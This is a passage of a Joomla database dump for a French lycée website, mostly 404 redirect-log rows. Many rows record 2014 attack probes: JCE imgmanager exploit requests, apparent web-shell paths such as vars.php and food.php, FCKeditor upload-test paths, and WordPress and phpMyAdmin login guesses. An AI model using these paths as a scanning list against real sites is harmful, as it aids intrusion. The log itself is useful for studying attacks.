(145, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/44-conseilleres-en-esf&amp;sa=U&amp;ei=w3f0UqjELcik4gS2rYGgCQ&amp;ved=0CGcQFjAQOMgB&amp;usg=AFQjCNFXWVXhDCE5MBRgKWBeRXK_CpUa7Q//administrator/components/com_maianmedia/utili', '', '', '', 1, 0, '2014-02-07 07:23:56', '0000-00-00 00:00:00'),
(146, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/44-conseilleres-en-esf&amp;sa=U&amp;ei=w3f0UqjELcik4gS2rYGgCQ&amp;ved=0CGcQFjAQOMgB&amp;usg=AFQjCNFXWVXhDCE5MBRgKWBeRXK_CpUa7Q//administrator/components/com_jnews/includes/o', '', '', '', 1, 0, '2014-02-07 07:23:57', '0000-00-00 00:00:00'),
(147, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/44-conseilleres-en-esf&amp;sa=U&amp;ei=w3f0UqjELcik4gS2rYGgCQ&amp;ved=0CGcQFjAQOMgB&amp;usg=AFQjCNFXWVXhDCE5MBRgKWBeRXK_CpUa7Q//administrator/components/com_jinc/classes/gra', '', '', '', 1, 0, '2014-02-07 07:23:57', '0000-00-00 00:00:00'),
(148, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/44-conseilleres-en-esf&amp;sa=U&amp;ei=w3f0UqjELcik4gS2rYGgCQ&amp;ved=0CGcQFjAQOMgB&amp;usg=AFQjCNFXWVXhDCE5MBRgKWBeRXK_CpUa7Q//administrator/components/com_maian15/charts/p', '', '', '', 1, 0, '2014-02-07 07:23:57', '0000-00-00 00:00:00'),
(149, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/44-conseilleres-en-esf&amp;sa=U&amp;ei=w3f0UqjELcik4gS2rYGgCQ&amp;ved=0CGcQFjAQOMgB&amp;usg=AFQjCNFXWVXhDCE5MBRgKWBeRXK_CpUa7Q//administrator/components/com_joomleague/asset', '', '', '', 1, 0, '2014-02-07 07:23:57', '0000-00-00 00:00:00'),
(150, 'http://www.lyceemaximiliensorre.fr/component/content/category/21-baccalaureats', '', '', '', 2, 0, '2014-02-18 20:41:25', '0000-00-00 00:00:00'),
(151, 'http://www.lyceemaximiliensorre.fr/component/content/category/22-etudes-post-bac', '', '', '', 2, 0, '2014-02-18 20:41:27', '0000-00-00 00:00:00'),
(152, 'http://www.lyceemaximiliensorre.fr/component/content/category/23-etudes-post-bts', '', '', '', 2, 0, '2014-02-18 20:41:28', '0000-00-00 00:00:00'),
(153, 'http://www.lyceemaximiliensorre.fr/component/content/category/www.admission-postbac.org', '', '', '', 90, 0, '2014-02-18 20:41:30', '0000-00-00 00:00:00'),
(154, 'http://www.lyceemaximiliensorre.fr/index.php/component/content/category/21-baccalaureats', '', '', '', 1, 0, '2014-02-19 08:34:33', '0000-00-00 00:00:00'),
(155, 'http://www.lyceemaximiliensorre.fr/index.php/component/content/category/22-etudes-post-bac', '', '', '', 1, 0, '2014-02-19 08:34:35', '0000-00-00 00:00:00'),
(156, 'http://www.lyceemaximiliensorre.fr/index.php/component/content/category/23-etudes-post-bts', '', '', '', 1, 0, '2014-02-19 08:34:36', '0000-00-00 00:00:00'),
(157, 'http://www.lyceemaximiliensorre.fr/index.php/component/content/category/8-sample-pages/lycee', '', '', '', 1, 0, '2014-02-19 08:34:40', '0000-00-00 00:00:00'),
(158, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/42-bts-cpge-dcg&amp;sa=U&amp;ei=JlcIU5L4KejgyQG6qICwAQ&amp;ved=0CCUQFjADOL4B&amp;usg=AFQjCNEhw3SfQKmY2igjj7ut9GxkOvC8gw/index.php?option=com_jce&task=plugin&plugin=imgmanage', '', '', '', 1, 0, '2014-02-22 07:53:49', '0000-00-00 00:00:00'),
(159, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b', '', '', '', 2, 0, '2014-02-22 07:53:49', '0000-00-00 00:00:00'),
(160, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/images/stories/vars.php?x', '', '', '', 2, 0, '2014-02-22 07:53:49', '0000-00-00 00:00:00'),
(161, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/42-bts-cpge-dcg&amp;sa=U&amp;ei=JlcIU5L4KejgyQG6qICwAQ&amp;ved=0CCUQFjADOL4B&amp;usg=AFQjCNEhw3SfQKmY2igjj7ut9GxkOvC8gw/images/stories/vars.php?x', '', '', '', 1, 0, '2014-02-22 07:53:49', '0000-00-00 00:00:00'),
(162, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 1, 0, '2014-02-22 08:01:37', '0000-00-00 00:00:00'),
(163, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription/42-bts-cpge-dcg&amp;sa=U&amp;ei=JlcIU6rpOceSyQGXvIDgDA&amp;ved=0CCUQFjADOL4B&amp;usg=AFQjCNF42_LgckISsqfV8LsQJp5IrzE45Q/index.php?option=com_jce&task=plugin&plugin=imgmanage', '', '', '', 1, 0, '2014-02-22 08:01:38', '0000-00-00 00:00:00'),
(164, 'http://lyceemaximiliensorre.fr/images/stories/vars.php?x', '', '', '', 1, 0, '2014-02-22 08:01:38', '0000-00-00 00:00:00'),
(165, 'http://www.lyceemaximiliensorre.fr/portefeuille', '', '', '', 1, 0, '2014-03-04 15:23:26', '0000-00-00 00:00:00'),
(166, 'http://www.lyceemaximiliensorre.fr/PortefeuillesSIO', '', '', '', 1, 0, '2014-03-04 15:26:04', '0000-00-00 00:00:00'),
(167, 'http://lyceemaximiliensorre.fr/portefeuilsio', '', '', '', 1, 0, '2014-03-07 03:34:56', '0000-00-00 00:00:00'),
(168, 'http://lyceemaximiliensorre.fr/component/content/category/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 2, 0, '2014-03-08 09:57:54', '0000-00-00 00:00:00'),
(169, 'http://lyceemaximiliensorre.fr/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b', '', '', '', 4, 0, '2014-03-08 09:57:54', '0000-00-00 00:00:00'),
(170, 'http://lyceemaximiliensorre.fr/component/content/category/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b', '', '', '', 2, 0, '2014-03-08 09:57:54', '0000-00-00 00:00:00'),
(171, 'http://lyceemaximiliensorre.fr/images/stories/food.php?rf', '', '', '', 1, 0, '2014-03-08 09:57:56', '0000-00-00 00:00:00'),
(172, 'http://lyceemaximiliensorre.fr/component/content/category/images/stories/food.php?rf', '', '', '', 1, 0, '2014-03-08 09:57:56', '0000-00-00 00:00:00'),
(173, 'http://lyceemaximiliensorre.fr/scp/', '', '', '', 2, 0, '2014-03-18 14:34:23', '0000-00-00 00:00:00'),
(174, 'http://lyceemaximiliensorre.fr/scp/admin*', '', '', '', 1, 0, '2014-03-18 14:34:33', '0000-00-00 00:00:00'),
(175, 'http://lyceemaximiliensorre.fr/scp/admin', '', '', '', 1, 0, '2014-03-18 14:34:36', '0000-00-00 00:00:00'),
(176, 'http://lyceemaximiliensorre.fr/support/loggin', '', '', '', 1, 0, '2014-03-24 09:49:40', '0000-00-00 00:00:00'),
(177, 'http://lyceemaximiliensorre.fr/portefeuillesSIO', '', '', '', 1, 0, '2014-03-25 12:37:00', '0000-00-00 00:00:00'),
(178, 'http://www.lyceemaximiliensorre.fr/cron.php?cron_type=tidy_warnings&sid=f1098f3989e050630706f2a3ef8c2a03', '', '', '', 3, 0, '2014-03-29 13:23:27', '0000-00-00 00:00:00'),
(179, 'http://www.lyceemaximiliensorre.fr/shopping_cart.php', '', '', '', 1, 0, '2014-04-05 17:17:10', '0000-00-00 00:00:00'),
(180, 'http://www.lyceemaximiliensorre.fr/catalog/shopping_cart.php', '', '', '', 1, 0, '2014-04-05 17:17:10', '0000-00-00 00:00:00'),
(181, 'http://www.lyceemaximiliensorre.fr/fr/order.php', '', '', '', 1, 0, '2014-04-05 17:17:10', '0000-00-00 00:00:00'),
(182, 'http://lyceemaximiliensorre.fr/wp-login.php', '', '', '', 2, 0, '2014-04-09 23:54:45', '0000-00-00 00:00:00'),
(183, 'http://lyceemaximiliensorre.fr/PorteFeuilleSIO/', '', '', '', 1, 0, '2014-04-25 16:13:59', '0000-00-00 00:00:00'),
(184, 'http://lyceemaximiliensorre.fr/PorteFeilleSIO', '', '', '', 1, 0, '2014-04-28 08:41:06', '0000-00-00 00:00:00'),
(185, 'http://www.lyceemaximiliensorre.fr/PortefeuilleSIO/PHPmyAdmin', '', '', '', 1, 0, '2014-04-28 20:35:46', '0000-00-00 00:00:00'),
(186, 'http://lyceemaximiliensorre.fr/blog/wp-login.php', '', '', '', 1, 0, '2014-05-02 03:37:28', '0000-00-00 00:00:00'),
(187, 'http://lyceemaximiliensorre.fr/index.php/images/page4-img2.jpg', '', '', '', 1, 0, '2014-05-24 12:45:52', '0000-00-00 00:00:00'),
(188, 'http://lyceemaximiliensorre.fr/component/content/article/14-procedure-inscription//images/stories/petx.gif', '', '', '', 1, 0, '2014-05-30 14:30:36', '0000-00-00 00:00:00'),
(189, 'http://www.lyceemaximiliensorre.fr/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:45', '0000-00-00 00:00:00'),
(190, 'http://www.lyceemaximiliensorre.fr/blog/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:46', '0000-00-00 00:00:00'),
(191, 'http://www.lyceemaximiliensorre.fr/wordpress/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:48', '0000-00-00 00:00:00'),
(192, 'http://www.lyceemaximiliensorre.fr/wp/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:48', '0000-00-00 00:00:00'),
(193, 'http://www.lyceemaximiliensorre.fr/news/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:49', '0000-00-00 00:00:00'),
(194, 'http://www.lyceemaximiliensorre.fr/test/wp-login.php', '', '', '', 1, 0, '2014-06-03 13:52:50', '0000-00-00 00:00:00'),
(195, 'http://www.lyceemaximiliensorre.fr/admin/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 4, 0, '2014-06-17 22:32:53', '0000-00-00 00:00:00'),
(196, 'http://www.lyceemaximiliensorre.fr/admin/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:32:54', '0000-00-00 00:00:00'),
(197, 'http://www.lyceemaximiliensorre.fr/manage/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:32:55', '0000-00-00 00:00:00'),
(198, 'http://www.lyceemaximiliensorre.fr/manager/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 3, 0, '2014-06-17 22:32:56', '0000-00-00 00:00:00'),
(199, 'http://www.lyceemaximiliensorre.fr/manager/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:32:57', '0000-00-00 00:00:00'),
(200, 'http://www.lyceemaximiliensorre.fr/editor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-17 22:32:58', '0000-00-00 00:00:00'),
(201, 'http://www.lyceemaximiliensorre.fr/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:32:59', '0000-00-00 00:00:00'),
(202, 'http://www.lyceemaximiliensorre.fr/FCK/editor/filemanager/upload/test.html', '', '', '', 3, 0, '2014-06-17 22:33:00', '0000-00-00 00:00:00'),
(203, 'http://www.lyceemaximiliensorre.fr/FCK/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:33:01', '0000-00-00 00:00:00'),
(204, 'http://www.lyceemaximiliensorre.fr/admin/editor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-17 22:33:03', '0000-00-00 00:00:00'),
(205, 'http://www.lyceemaximiliensorre.fr/admin/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:33:04', '0000-00-00 00:00:00'),
(206, 'http://www.lyceemaximiliensorre.fr/admin/fck/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-17 22:33:05', '0000-00-00 00:00:00'),
(207, 'http://www.lyceemaximiliensorre.fr/admin/fck/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-17 22:33:06', '0000-00-00 00:00:00'),
(208, 'http://www.lyceemaximiliensorre.fr/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-17 22:39:24', '0000-00-00 00:00:00'),
(209, 'http://www.lyceemaximiliensorre.fr/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-17 22:39:26', '0000-00-00 00:00:00'),
(210, 'http://www.lyceemaximiliensorre.fr/manage/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-17 22:39:28', '0000-00-00 00:00:00'),
(211, 'http://lyceemaximiliensorre.fr/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://lyceemaximiliensorre.fr/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-06-19 06:46:20', '0000-00-00 00:00:00'),
(212, 'http://lyceemaximiliensorre.fr/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://lyceemaximiliensorre.fr/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-06-19 06:46:21', '0000-00-00 00:00:00'),
(213, 'http://lyceemaximiliensorre.fr/editor/filemanager/browser/default/connectors/test.html', '', 'http://lyceemaximiliensorre.fr/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-06-19 06:46:22', '0000-00-00 00:00:00'),
(214, 'http://lyceemaximiliensorre.fr/manage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://lyceemaximiliensorre.fr/manage/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-06-19 06:46:23', '0000-00-00 00:00:00'),
(215, 'http://lyceemaximiliensorre.fr/system/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://lyceemaximiliensorre.fr/system/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-06-19 06:46:24', '0000-00-00 00:00:00'),
(216, 'http://www.lyceemaximiliensorre.fr/admin/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:57:54', '0000-00-00 00:00:00'),
(217, 'http://www.lyceemaximiliensorre.fr/fck/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:57:59', '0000-00-00 00:00:00'),
(218, 'http://www.lyceemaximiliensorre.fr/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 2, 0, '2014-06-21 17:58:00', '0000-00-00 00:00:00'),
(219, 'http://www.lyceemaximiliensorre.fr/manage/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:01', '0000-00-00 00:00:00'),
(220, 'http://www.lyceemaximiliensorre.fr/system/fckeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:02', '0000-00-00 00:00:00'),
(221, 'http://www.lyceemaximiliensorre.fr/system/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:03', '0000-00-00 00:00:00'),
(222, 'http://www.lyceemaximiliensorre.fr/manager/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:04', '0000-00-00 00:00:00'),
(223, 'http://www.lyceemaximiliensorre.fr/include/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:04', '0000-00-00 00:00:00'),
(224, 'http://www.lyceemaximiliensorre.fr/include/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:05', '0000-00-00 00:00:00'),
(225, 'http://www.lyceemaximiliensorre.fr/includes/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:05', '0000-00-00 00:00:00');
INSERT INTO `jos_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(226, 'http://www.lyceemaximiliensorre.fr/includes/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:05', '0000-00-00 00:00:00'),
(227, 'http://www.lyceemaximiliensorre.fr/CKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:06', '0000-00-00 00:00:00'),
(228, 'http://www.lyceemaximiliensorre.fr/CKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:06', '0000-00-00 00:00:00'),
(229, 'http://www.lyceemaximiliensorre.fr/inc/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:07', '0000-00-00 00:00:00'),
(230, 'http://www.lyceemaximiliensorre.fr/inc/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:07', '0000-00-00 00:00:00'),
(231, 'http://www.lyceemaximiliensorre.fr/administrator/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:08', '0000-00-00 00:00:00'),
(232, 'http://www.lyceemaximiliensorre.fr/administrator/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:08', '0000-00-00 00:00:00'),
(233, 'http://www.lyceemaximiliensorre.fr/web/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-21 17:58:08', '0000-00-00 00:00:00'),
(234, 'http://www.lyceemaximiliensorre.fr/web/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-21 17:58:09', '0000-00-00 00:00:00'),
(235, 'http://www.lyceemaximiliensorre.fr//FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:52:06', '0000-00-00 00:00:00'),
(236, 'http://www.lyceemaximiliensorre.fr//FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:52:15', '0000-00-00 00:00:00'),
(237, 'http://www.lyceemaximiliensorre.fr//admin/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:52:24', '0000-00-00 00:00:00'),
(238, 'http://www.lyceemaximiliensorre.fr//admin/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:52:31', '0000-00-00 00:00:00'),
(239, 'http://www.lyceemaximiliensorre.fr//manage/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:52:40', '0000-00-00 00:00:00'),
(240, 'http://www.lyceemaximiliensorre.fr//manage/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:52:45', '0000-00-00 00:00:00'),
(241, 'http://www.lyceemaximiliensorre.fr//manager/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:52:52', '0000-00-00 00:00:00'),
(242, 'http://www.lyceemaximiliensorre.fr//manager/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:52:55', '0000-00-00 00:00:00'),
(243, 'http://www.lyceemaximiliensorre.fr//editor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:52:58', '0000-00-00 00:00:00'),
(244, 'http://www.lyceemaximiliensorre.fr//editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:53:06', '0000-00-00 00:00:00'),
(245, 'http://www.lyceemaximiliensorre.fr//FCK/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:53:09', '0000-00-00 00:00:00'),
(246, 'http://www.lyceemaximiliensorre.fr//FCK/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:53:16', '0000-00-00 00:00:00'),
(247, 'http://www.lyceemaximiliensorre.fr//admin/editor/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:53:23', '0000-00-00 00:00:00'),
(248, 'http://www.lyceemaximiliensorre.fr//admin/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 2, 0, '2014-06-22 08:53:30', '0000-00-00 00:00:00'),
(249, 'http://www.lyceemaximiliensorre.fr//admin/fck/editor/filemanager/upload/test.html', '', '', '', 2, 0, '2014-06-22 08:53:37', '0000-00-00 00:00:00'),
(250, 'http://www.lyceemaximiliensorre.fr//admin/fck/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-23 03:20:23', '0000-00-00 00:00:00'),
(251, 'http://www.lyceemaximiliensorre.fr//FCKeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:24', '0000-00-00 00:00:00'),
(252, 'http://www.lyceemaximiliensorre.fr//FCKeditor/editor/fialemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:24', '0000-00-00 00:00:00'),
(253, 'http://www.lyceemaximiliensorre.fr//CKeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:25', '0000-00-00 00:00:00'),
(254, 'http://www.lyceemaximiliensorre.fr//CKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-23 03:20:25', '0000-00-00 00:00:00'),
(255, 'http://www.lyceemaximiliensorre.fr//CKeditor/editor/fialemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:26', '0000-00-00 00:00:00'),
(256, 'http://www.lyceemaximiliensorre.fr//CKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-23 03:20:26', '0000-00-00 00:00:00'),
(257, 'http://www.lyceemaximiliensorre.fr//includes/FCKeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:27', '0000-00-00 00:00:00'),
(258, 'http://www.lyceemaximiliensorre.fr//includes/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2014-06-23 03:20:28', '0000-00-00 00:00:00'),
(259, 'http://www.lyceemaximiliensorre.fr//includes/FCKeditor/editor/fialemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:29', '0000-00-00 00:00:00'),
(260, 'http://www.lyceemaximiliensorre.fr//includes/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-06-23 03:20:29', '0000-00-00 00:00:00'),
(261, 'http://www.lyceemaximiliensorre.fr//admin/FCKeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:30', '0000-00-00 00:00:00'),
(262, 'http://www.lyceemaximiliensorre.fr//admin/FCKeditor/editor/fialemanager/connectors/test.html', '', '', '', 1, 0, '2014-06-23 03:20:30', '0000-00-00 00:00:00'),
(263, 'http://www.lyceemaximiliensorre.fr/js/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-07-06 03:53:58', '0000-00-00 00:00:00'),
(264, 'http://lyceemaximiliensorre.fr/MbOjZ/MbZVZ/PortefeuilleSIO/index.php', '', '', '', 1, 0, '2014-07-08 17:10:03', '0000-00-00 00:00:00'),
(265, 'http://www.lyceemaximiliensorre.fr/QboUZ/index.php/actualites', '', '', '', 1, 0, '2014-07-09 00:59:47', '0000-00-00 00:00:00'),
(266, 'http://lyceemaximiliensorre.fr/mysql', '', 'http://lyceemaximiliensorre.fr/mysql', '', 1, 0, '2014-07-26 17:42:11', '0000-00-00 00:00:00'),
(267, 'http://lyceemaximiliensorre.fr/phpMyAdmin', '', 'http://lyceemaximiliensorre.fr/phpMyAdmin', '', 2, 0, '2014-07-26 17:42:11', '0000-00-00 00:00:00'),
(268, 'http://lyceemaximiliensorre.fr/pma', '', 'http://lyceemaximiliensorre.fr/pma', '', 1, 0, '2014-07-26 17:42:11', '0000-00-00 00:00:00'),
(269, 'http://lyceemaximiliensorre.fr/myadmin', '', 'http://lyceemaximiliensorre.fr/myadmin', '', 1, 0, '2014-07-26 17:42:13', '0000-00-00 00:00:00'),
(270, 'http://lyceemaximiliensorre.fr/phpmyadmin2', '', 'http://lyceemaximiliensorre.fr/phpmyadmin2', '', 1, 0, '2014-07-26 17:42:14', '0000-00-00 00:00:00'),
(271, 'http://lyceemaximiliensorre.fr/phpMyAdmin/', '', '', '', 1, 0, '2014-07-29 18:07:53', '0000-00-00 00:00:00'),
(272, 'http://lyceemaximiliensorre.fr/index.php/intranet/22-etudes-post-bac/trackback/', '', 'http://lyceemaximiliensorre.fr/index.php/intranet/22-etudes-post-bac', '', 2, 0, '2014-08-03 21:24:47', '0000-00-00 00:00:00'),
(273, 'http://www.lyceemaximiliensorre.fr/brochures pdf/dossier _inscription_2ndespe.pdf', '', '', '', 1, 0, '2016-03-31 15:43:40', '0000-00-00 00:00:00'),
(274, 'http://localhost/lms/dsden94', '', 'http://localhost/lms/40-pre-bac-seconde-premiere-et-terminale', '', 1, 0, '2016-06-08 12:20:24', '0000-00-00 00:00:00'),
(275, 'http://localhost/lms/test', '', '', '', 1, 0, '2016-06-08 14:01:24', '0000-00-00 00:00:00'),
(276, 'http://localhost/lms/loremipsum', '', '', '', 4, 0, '2016-06-08 14:01:51', '0000-00-00 00:00:00'),
(277, 'http://localhost/lms/intranet', '', 'http://localhost/lms/', '', 1, 0, '2016-06-09 12:50:35', '0000-00-00 00:00:00'),
(278, 'http://localhost/lms/102-intranet', '', 'http://localhost/lms/', '', 1, 0, '2016-06-09 12:51:30', '0000-00-00 00:00:00'),
(279, 'http://localhost/lms/tp=1', '', '', '', 1, 0, '2016-06-15 10:40:17', '0000-00-00 00:00:00'),
(280, 'http://localhost/lms/pre-bac', '', 'http://localhost/lms/', '', 1, 0, '2016-06-15 12:30:20', '0000-00-00 00:00:00'),
(281, 'http://localhost/lmstest/lycee', '', 'http://localhost/lmstest/', '', 6, 0, '2016-06-16 09:45:05', '0000-00-00 00:00:00'),
(282, 'http://localhost/lmstest/vie-scolaire', '', 'http://localhost/lmstest/contact', '', 1, 0, '2016-06-16 10:43:03', '0000-00-00 00:00:00'),
(283, 'http://localhost/lmstest/actualite/index.php', '', 'http://localhost/lmstest/actualite/art-actualite-poster', '', 2, 0, '2016-06-16 13:39:34', '0000-00-00 00:00:00'),
(284, 'http://localhost/lmstest/lycee/Smart Search/Joomla! Update', '', 'http://localhost/lmstest/index.php', '', 1, 0, '2016-06-17 07:22:26', '0000-00-00 00:00:00'),
(285, 'http://localhost/lmstest/art-formation-formations', '', '', '', 1, 0, '2016-06-20 13:11:49', '0000-00-00 00:00:00'),
(286, 'http://localhost/lmstest/formations/art-formation-formations', '', '', '', 1, 0, '2016-06-20 13:12:05', '0000-00-00 00:00:00'),
(287, 'http://localhost/lmstest/form-pre-bac', '', 'http://localhost/lmstest/formations', '', 1, 0, '2016-06-21 07:54:00', '0000-00-00 00:00:00'),
(288, 'http://localhost/lmstest/lmstest/formations/form-pre-bac', '', 'http://localhost/lmstest/formations', '', 1, 0, '2016-06-21 07:56:44', '0000-00-00 00:00:00'),
(289, 'http://localhost/lmstest/126-form-pre-bac', '', 'http://localhost/lmstest/formations', '', 1, 0, '2016-06-21 07:58:04', '0000-00-00 00:00:00'),
(290, 'http://localhost/lmstest/cdi', '', '', '', 1, 0, '2016-06-22 13:26:49', '0000-00-00 00:00:00'),
(291, 'http://localhost/lmstest/116-cdi', '', '', '', 1, 0, '2016-06-22 13:27:04', '0000-00-00 00:00:00'),
(292, 'http://localhost/lmstest/undefined', '', 'http://localhost/lmstest/lycee', '', 66, 0, '2016-06-23 08:46:42', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `jos_schemas`
--

CREATE TABLE IF NOT EXISTS `jos_schemas` (
  `extension_id` int(11) NOT NULL,
  `version_id` varchar(20) NOT NULL,
  PRIMARY KEY (`extension_id`,`version_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_schemas`
--

INSERT INTO `jos_schemas` (`extension_id`, `version_id`) VALUES
(700, '2.5.16'),
(10006, '3.6.0-2012-07-31');

-- --------------------------------------------------------

--
-- Table structure for table `jos_session`
--

CREATE TABLE IF NOT EXISTS `jos_session` (
  `session_id` varchar(200) NOT NULL DEFAULT '',
  `client_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `guest` tinyint(4) unsigned DEFAULT '1',
  `time` varchar(14) DEFAULT '',
  `data` mediumtext,
  `userid` int(11) DEFAULT '0',
  `username` varchar(150) DEFAULT '',
  `usertype` varchar(50) DEFAULT '',
  PRIMARY KEY (`session_id`),
  KEY `whosonline` (`guest`,`usertype`),
  KEY `userid` (`userid`),
  KEY `time` (`time`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_session`
--

INSERT INTO `jos_session` (`session_id`, `client_id`, `guest`, `time`, `data`, `userid`, `username`, `usertype`) VALUES
